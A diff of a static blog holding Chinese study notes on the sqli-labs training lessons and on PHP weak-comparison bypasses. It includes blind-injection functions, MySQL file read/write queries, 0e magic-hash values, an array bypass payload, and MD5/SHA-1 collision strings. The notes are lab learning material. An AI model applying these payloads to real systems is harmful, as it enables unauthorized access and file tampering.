+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="sql——labs"><a href="#sql——labs" class="headerlink" title="sql——labs"></a>sql——labs</h1><h1 id="Less—1"><a href="#Less—1" class="headerlink" title="Less—1"></a>Less—1</h1><p>字符型包裹为 ‘’</p>
+<h1 id="Less—2"><a href="#Less—2" class="headerlink" title="Less—2"></a>Less—2</h1><p>数字型无包裹</p>
+<h1 id="Less—3"><a href="#Less—3" class="headerlink" title="Less—3"></a>Less—3</h1><p>字符括号包裹（’’）</p>
+<h1 id="Less—4"><a href="#Less—4" class="headerlink" title="Less—4"></a>Less—4</h1><p>字符双引号括号包裹（””）</p>
+<h1 id="Less—5"><a href="#Less—5" class="headerlink" title="Less—5"></a>Less—5</h1><p>布尔盲注</p>
+<blockquote>
+<p><strong>1.left函数：</strong> select left(database(),1)&#x3D;’s’;  left(a,b)从左侧截取a的前b位，正确则返回，错误返回</p>
+<p><strong>2.regexp函数：</strong> select user() regexp ‘r’;   user()的结果是root，regexp为匹配root的正则表达式</p>
+<p><strong>3.like函数：</strong> select user() like ‘ro%’;	 匹配与regexp相似</p>
+<p><strong>4.substr(a,b,c):</strong>  select substr() XXXX;     substr(a,b,c)从位置b开始，截取a字符串c位长度  select substr((select database()),1,1)&#x3D;’s’;</p>
+<p><strong>5.ascii:</strong></p>
+<p><strong>6.chr(‘数字’)  ord(‘字母’)</strong>  			   python中转换ascii值</p>
+</blockquote>
+<p>‍</p>
+<h1 id="Less——7"><a href="#Less——7" class="headerlink" title="Less——7"></a>Less——7</h1><blockquote>
+<p>补充知识点</p>
+<p>​<code>show variables like &#39;%secure%&#39;;</code>​查看secure-file-priv当前的值，如果显示为NULL，则需要打开，：\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure file priv&#x3D;”&#x2F;”。</p>
+<p>而且要先设置secure_file_priv&#x3D;,如果它为空则可以指定任意目录，如果设置等于某个路径就只能在这个指定路径下，而它为NULL则禁止导入导出功能</p>
+<p>​<code>load_file()</code>​读取本地文件<code>select load_file(&#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7&#39;)</code>​</p>
+<p>​<code>into outfile</code>​写文件    用法：<code>select &#39;mysql is very good&#39; into outfile &#39;test1.txt&#39;;</code>​</p>
+<pre><code>				文件位置： 是在sql版本下的data文件中
+</code></pre>
+<p>我们要写到绝对位置那就，双反斜线是因为\t这种类型被转义掉了</p>
+<p>​<code>select &#39;a&#39; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\tsxt.txt&#39;；</code>​</p>
+<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">！！！注意sql语句中\需要转译</span></p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" data-id="cmawcq0nf003srk7k9o5wcuu9" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -532,7 +438,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" data-id="cmawck7in003trk7k30ft2lv4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/union%20%E6%B3%A8%E5%85%A5/" data-id="cmawcq0nh003zrk7kfjvz4kqs" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -567,62 +473,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cmawck7iu0044rk7kc1m4b6n2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="sql——labs"><a href="#sql——labs" class="headerlink" title="sql——labs"></a>sql——labs</h1><h1 id="Less—1"><a href="#Less—1" class="headerlink" title="Less—1"></a>Less—1</h1><p>字符型包裹为 ‘’</p>
-<h1 id="Less—2"><a href="#Less—2" class="headerlink" title="Less—2"></a>Less—2</h1><p>数字型无包裹</p>
-<h1 id="Less—3"><a href="#Less—3" class="headerlink" title="Less—3"></a>Less—3</h1><p>字符括号包裹（’’）</p>
-<h1 id="Less—4"><a href="#Less—4" class="headerlink" title="Less—4"></a>Less—4</h1><p>字符双引号括号包裹（””）</p>
-<h1 id="Less—5"><a href="#Less—5" class="headerlink" title="Less—5"></a>Less—5</h1><p>布尔盲注</p>
-<blockquote>
-<p><strong>1.left函数：</strong> select left(database(),1)&#x3D;’s’;  left(a,b)从左侧截取a的前b位，正确则返回，错误返回</p>
-<p><strong>2.regexp函数：</strong> select user() regexp ‘r’;   user()的结果是root，regexp为匹配root的正则表达式</p>
-<p><strong>3.like函数：</strong> select user() like ‘ro%’;	 匹配与regexp相似</p>
-<p><strong>4.substr(a,b,c):</strong>  select substr() XXXX;     substr(a,b,c)从位置b开始，截取a字符串c位长度  select substr((select database()),1,1)&#x3D;’s’;</p>
-<p><strong>5.ascii:</strong></p>
-<p><strong>6.chr(‘数字’)  ord(‘字母’)</strong>  			   python中转换ascii值</p>
-</blockquote>
-<p>‍</p>
-<h1 id="Less——7"><a href="#Less——7" class="headerlink" title="Less——7"></a>Less——7</h1><blockquote>
-<p>补充知识点</p>
-<p>​<code>show variables like &#39;%secure%&#39;;</code>​查看secure-file-priv当前的值，如果显示为NULL，则需要打开，：\phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure file priv&#x3D;”&#x2F;”。</p>
-<p>而且要先设置secure_file_priv&#x3D;,如果它为空则可以指定任意目录，如果设置等于某个路径就只能在这个指定路径下，而它为NULL则禁止导入导出功能</p>
-<p>​<code>load_file()</code>​读取本地文件<code>select load_file(&#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7&#39;)</code>​</p>
-<p>​<code>into outfile</code>​写文件    用法：<code>select &#39;mysql is very good&#39; into outfile &#39;test1.txt&#39;;</code>​</p>
-<pre><code>				文件位置： 是在sql版本下的data文件中
-</code></pre>
-<p>我们要写到绝对位置那就，双反斜线是因为\t这种类型被转义掉了</p>
-<p>​<code>select &#39;a&#39; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\tsxt.txt&#39;；</code>​</p>
-<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">！！！注意sql语句中\需要转译</span></p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" data-id="cmawck7iy004ark7k1mdvcu3g" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" data-id="cmawcq0nv004urk7k3y1n8j94" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -840,327 +691,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" data-id="cmawck7hk0004rk7kbeby9e94" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/PHP比较漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="PHP比较漏洞"><a href="#PHP比较漏洞" class="headerlink" title="PHP比较漏洞"></a>PHP比较漏洞</h1><h1 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h1><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.comparison.php">php</a>中有两种比较的符号 <code>==</code>​ 与 <code>===</code>​</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">	<span class="variable">$a</span> == <span class="variable">$b</span>;  <span class="comment">// ==  在进行比较的时候，会先将字符串类型转化成相同，再比较</span></span><br><span class="line">	<span class="variable">$a</span> === <span class="variable">$b</span>; <span class="comment">// === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>&#x3D;&#x3D;PHP 8.0.0 之前，如果 string 与数字或者以数字开头的字符串进行比较， 则在&#x3D;&#x3D;​**&#x3D;&#x3D;比较前会将 string 转化为数字&#x3D;&#x3D;**​&#x3D;&#x3D;。&#x3D;&#x3D;</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250417174634-5opnoh2.png" alt="image"></p>
-<p><img src="/.com//image-20250417174637-541lm5p.png" alt="image"></p>
-<p>实验结果：</p>
-<ol>
-<li>​<code>&quot;admin&quot;==0</code>​ 比较的时候，会将字符串<code>admin</code>​强制转化成整数<code>0</code>​</li>
-<li>​<code>&quot;1admin&quot;==1</code>​ 比较的时候，会将字符串<code>1admin</code>​强制转化成整数<code>1</code>​</li>
-<li>字符串<code>admin1</code>​强制转化成整数<code>0</code>​</li>
-<li>​<code>&quot;0e123456&quot;==&quot;0e456789&quot;</code>​比较的时候，PHP会将开头为<code>0e</code>​这类字符串识别为科学计数法的数字，<code>0e123456</code>​相当于<code>&lt;span class=&quot;ne-text&quot;&gt;0*10&lt;/span&gt;&lt;sup&gt;123456&lt;/sup&gt;&lt;span class=&quot;ne-text&quot;&gt; = 0&lt;/span&gt;</code>​，同理，<code>0e456789=0</code>​，所以两者相等。</li>
-</ol>
-<blockquote>
-<p>注意：例子中的字符串还有一个特征，<code>0e</code>​后面字符全是数字，才能漏洞利用，否则例如<code>0e3f2c44</code>​仍然会被识别成字符串。</p>
-</blockquote>
-<h1 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h1><p><img src="/.com//image-20250417174658-89jjpnd.png" alt="image"></p>
-<p><img src="/.com//image-20250417174701-vej9ys6.png" alt="image"></p>
-<p>&#x3D;&#x3D;当字符串被强制转化为数值，其结果和类型如下:&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;如果该字符串没有包含&#x3D;&#x3D;​&#x3D;&#x3D;​<code>&#39;.&#39;, e, E</code>​&#x3D;&#x3D;​&#x3D;&#x3D;并且其数值在整形范围之内，该字符串作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>int</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值，其他所有情况下都被作为&#x3D;&#x3D;​&#x3D;&#x3D;​<code>float</code>​&#x3D;&#x3D;​&#x3D;&#x3D;来取值；&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。&#x3D;&#x3D;</p>
-<p>也印证了实验1中通过<code>&quot;admin1&quot;==1 =&gt;False</code>​</p>
-<h1 id="0e绕过弱比较-MD5和SHA1函数漏洞"><a href="#0e绕过弱比较-MD5和SHA1函数漏洞" class="headerlink" title="0e绕过弱比较-MD5和SHA1函数漏洞"></a>0e绕过弱比较-MD5和SHA1函数漏洞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &amp;&amp;<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">  </span><br><span class="line">(<span class="title function_ invoke__">sha1</span>(<span class="variable">$s1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$s2</span>) &amp;&amp; <span class="variable">$s1</span>!=<span class="variable">$s2</span>)</span><br></pre></td></tr></table></figure>
-
-<p>​<code>sha1</code>​和<code>md5</code>​属于哈希编码，在<code>PHP</code>​中，这两种编码是存在绕过漏洞的。</p>
-<p>PHP在处理哈希字符串时，利用<code>!=</code>​或<code>==</code>​来对哈希值进行比较，把以<code>0e</code>​开头的哈希值都解释为<code>0</code>​，所以如果两个不同的密码经过哈希加密后，其哈希值都是以<code>0e</code>​开头的，那么<code>0e</code>​将会认为他们相同，都是<code>0</code>​。只需要传入开头都是<code>0e</code>​的两个值，比如<code>$s1=QNKCDZO</code>​,<code> $s2=240610708</code>​, 便可成功绕过。</p>
-<p>利用<code>0e</code>​绕过方式只有在弱比较的时候才能使用。</p>
-<h1 id="实验3"><a href="#实验3" class="headerlink" title="实验3"></a>实验3</h1><p><img src="/.com//image-20250417174743-u6bmulp.png" alt="image"></p>
-<p><img src="/.com//image-20250417174746-61l5osn.png" alt="image"></p>
-<p>以下值在<code>md5</code>​加密后以<code>0e</code>​开头：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
-
-<p>验证</p>
-<p><img src="/.com//image-20250417174803-33e2qv1.png" alt="image"></p>
-<p>批量验证</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;QNKCDZO&#x27;</span>, <span class="string">&#x27;240610708&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s878926199a&#x27;</span>, <span class="string">&#x27;s155964671a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s214587387a&#x27;</span>, <span class="string">&#x27;s214587387a&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250417174815-hvdrbp5.png" alt="image"></p>
-<p>以下值在<code>sha1</code>​加密后以<code>0e</code>​开头</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;aaroZmOk&#x27;</span>, <span class="string">&#x27;aaK1STfY&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aaO8zKZF&#x27;</span>, <span class="string">&#x27;aa3OFF9m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0e1290633704&#x27;</span>, <span class="string">&#x27;10932435112&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">sha1</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250417174829-y4ysat8.png" alt="image"></p>
-<p>双重<code>MD5</code>​加密后<code>0e</code>​开头：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">ants = [<span class="string">&#x27;7r4lGXCH2Ksu2JNT3BYM&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CbDLytmyGm2xQyaLNhWn&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;770hQgrBOjrcqftrlaZk&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ant in ants:</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(ant.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    cipher = hashlib.<span class="title function_ invoke__">md5</span>(cipher.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&#x27;[-]&#123;ant&#125;\n&#123;cipher&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/.com//image-20250417174839-vxse526.png" alt="image"></p>
-<blockquote>
-<p>其它情况：会限制字符串为纯数字或字母</p>
-</blockquote>
-<p>‍</p>
-<h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><p>对于php强比较和弱比较：<code>md5()</code>​，<code>sha1()</code>​函数无法处理数组，如果传入的为数组，会返回<code>NULL</code>​，所以两个数组经过加密后得到的都是<code>NULL</code>​，也就是相等的。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;...&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​<code>payload: ?a[]=1&amp;b[]=2	</code>​</p>
-<p>‍</p>
-<h1 id="实验4"><a href="#实验4" class="headerlink" title="实验4"></a>实验4</h1><p><img src="/.com//image-20250417174912-0qsam45.png" alt="image"></p>
-<p><img src="/.com//image-20250417174914-tik3goc.png" alt="image"></p>
-<p>‍</p>
-<h1 id="实验5"><a href="#实验5" class="headerlink" title="实验5"></a>实验5</h1><p>查看报错信息去验证上述结论</p>
-<p><img src="/.com//image-20250417174924-ovxj2mz.png" alt="image"></p>
-<p><img src="/.com//image-20250417174927-4udg3hc.png" alt="image"></p>
-<p>​<code>md5()</code>​函数希望接受的是字符串而不是数组。</p>
-<p>‍</p>
-<h1 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; </span><br><span class="line">   <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;...&#125;</span><br></pre></td></tr></table></figure>
-
-<p>比较<code>a</code>​，<code>b</code>​时会将<code>a</code>​，<code>b</code>​转换为字符串比较，就不能用数组绕过了。因为数组转换为字符串时都会变成<code>&quot;Array&quot;</code>​。</p>
-<p>‍</p>
-<h1 id="实验6"><a href="#实验6" class="headerlink" title="实验6"></a>实验6</h1><p><img src="/.com//image-20250417174950-8fwszbt.png" alt="image"></p>
-<p><img src="/.com//image-20250417174953-l3vi7qb.png" alt="image"></p>
-<p>因为数组要求构造a和b不同，但是MD5相同，也就是说要求传入两个MD5相同的不同字符串。所以我们只能用MD5碰撞来实现</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"><span class="variable">$b</span>=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-<h1 id="实验7"><a href="#实验7" class="headerlink" title="实验7"></a>实验7</h1><p><img src="/.com//image-20250417175005-bwx4402.png" alt="image"></p>
-<p><img src="/.com//image-20250417175008-g6uw5ex.png" alt="image"></p>
-<p>‍</p>
-<p>文件：</p>
-<p>linux使用md5collgen碰撞生成两个md5值相同但内容不同的文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5collgen -o <span class="number">1</span>.bin <span class="number">2</span>.bin</span><br></pre></td></tr></table></figure>
-
-<p>windows可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll.exe -p <span class="number">123</span>.txt -o <span class="number">1</span>.txt <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-<h1 id="sha1碰撞："><a href="#sha1碰撞：" class="headerlink" title="sha1碰撞："></a>sha1碰撞：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>%<span class="number">7</span>FF%DC%<span class="number">93</span>%A6%B6%<span class="number">7</span>E%<span class="number">01</span>%<span class="number">3</span>B%<span class="number">02</span>%<span class="number">9</span>A%AA%<span class="number">1</span>D%B2V%<span class="number">0</span>BE%CAg%D6%<span class="number">88</span>%C7%F8K%<span class="number">8</span>CLy%<span class="number">1</span>F%E0%<span class="number">2</span>B%<span class="number">3</span>D%F6%<span class="number">14</span>%F8m%B1i%<span class="number">09</span>%<span class="number">01</span>%C5kE%C1S%<span class="number">0</span>A%FE%DF%B7%<span class="number">608</span>%E9rr/%E7%ADr%<span class="number">8</span>F%<span class="number">0</span>EI%<span class="number">04</span>%E0F%C20W%<span 